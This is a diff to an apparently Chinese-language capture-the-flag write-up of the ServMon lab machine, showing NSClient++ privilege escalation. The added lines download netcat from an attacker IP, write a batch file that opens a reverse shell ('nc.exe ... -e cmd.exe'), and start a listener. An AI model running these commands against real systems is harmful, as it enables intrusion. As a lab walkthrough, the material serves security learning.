@@ -621,14 +621,53 @@ nadine@SERVMON C:\Users\Nadine>
 tcp   LISTEN 0      128                                        127.0.0.1:8443             0.0.0.0:*    users:(("ssh",pid=147723,fd=5))           
 tcp   LISTEN 0      128                                            [::1]:8443                [::]:*    users:(("ssh",pid=147723,fd=4))
 ```
-#### https://localhost:8443
-#### 首先，我们必须转到NSClient++的settings选项卡，以便创建一个新脚本。
-#### Settings -> settings -> external scripts -> scripts -> Add an alias
-![图片](images/2026020904.png)
 #### 我们创建一个执行nc.exe的新脚本（它可以使用scp上传，也可以直接从我们的smb-share上传），并向我们的机器返回一个反向shell。
 #### 该漏洞说明系统需要重新启动才能触发该漏洞，然而在挖掘web控制台时，我发现可以直接从web控制台执行脚本。
 #### 通过在web控制台中输入脚本的别名，我们可以手动执行负载。
 ```
 [★]$ wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
-```
+[★]$ echo '\programdata\nc.exe 10.10.14.134 443 -e cmd.exe' > shell.bat
+[★]$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 
+```
+```
+nadine@SERVMON C:\ProgramData>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\ProgramData>
+PS C:\ProgramData> powershell wget http://10.10.14.134:8011/nc64.exe -outfile nc.exe
+PS C:\ProgramData> powershell wget http://10.10.14.134:8011/shell.bat -outfile shell.bat
+PS C:\ProgramData> ls
+
+
+    Directory: C:\ProgramData
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/28/2022   6:32 PM                chocolatey
+d---s-        2/28/2022   3:55 PM                Microsoft
+d-----        2/28/2022   6:46 PM                NVMS-1000
+d-----        2/28/2022   6:24 PM                Package Cache
+d-----        2/25/2025   5:39 AM                regid.1991-06.com.microsoft
+d-----        9/15/2018  12:19 AM                SoftwareDistribution
+d-----        2/25/2025   5:46 AM                ssh
+d-----        9/15/2018  12:19 AM                USOPrivate
+d-----       11/11/2019   6:52 PM                USOShared
+d-----        2/28/2022   5:44 PM                VMware
+-a----         2/9/2026   7:31 AM          55296 nc.exe
+-a----         2/9/2026   7:35 AM             48 shell.bat
+
+
+PS C:\ProgramData>  
+```
+```
+ [★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+```
+#### https://localhost:8443
+#### 首先，我们必须转到NSClient++的settings选项卡，以便创建一个新脚本。
+#### Settings -> settings -> external scripts -> scripts -> 
+![图片](images/2026020904.png)
